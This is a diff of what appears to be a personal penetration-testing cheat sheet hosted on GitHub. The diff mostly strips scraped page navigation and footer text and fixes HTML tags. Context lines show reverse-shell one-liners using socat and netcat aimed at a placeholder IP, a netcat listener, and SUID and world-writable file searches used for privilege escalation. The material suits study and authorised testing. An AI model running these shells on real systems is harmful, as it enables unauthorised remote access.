@@ -1,36 +1,5 @@
-# Reference
-General stuff that people overlook to use 
-
-Skip to content
-Pull requests
-Issues
-Marketplace
-Explore
-@pyro0ownz
-pyro0ownz /
-Reference
-Public
-
-Code
-Issues
-Pull requests
-Actions
-Projects
-Wiki
-Security
-Insights
-
-    Settings
-
-Reference/References
-@pyro0ownz
-pyro0ownz Create References
-Latest commit c66e452 20 seconds ago
-History
-1 contributor
-216 lines (153 sloc) 6.74 KB
-<h1>####################General Reference list (Incomplete) ###################</h1>
-            <h4>######I will add to this more as have more time#######</h4>
+<h1>General Reference list (Incomplete)</h1>
+<h4>I will add to this more as have more time/h4>
 
 <h3>#search for public exploits</h3> 
 
@@ -71,7 +40,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxx.xxx.xxx.xxx:666
 nc -lnvp 666 #listener
 nc ip port –e /bin/bash #reverse shell netcat needs to be upgraded with above shells. </p>
 
-<h3>#Linux permission search</h>
+<h3>#Linux permission search</h3>
 <p>find /usr/bin/ -perm -u=s # set uids 
 
 find / -writable -type d 2>/dev/null # world-writeable folders
@@ -244,19 +213,3 @@ AutoRecon </p>
 <p><b>More to come when i can gather my thoughts and play with some more stuff. Wish you luck and hope this helps!</b></p>
 
  
-
-    © 2021 GitHub, Inc.
-
-    Terms
-    Privacy
-    Security
-    Status
-    Docs
-    Contact GitHub
-    Pricing
-    API
-    Training
-    Blog
-    About
-
-Loading complete
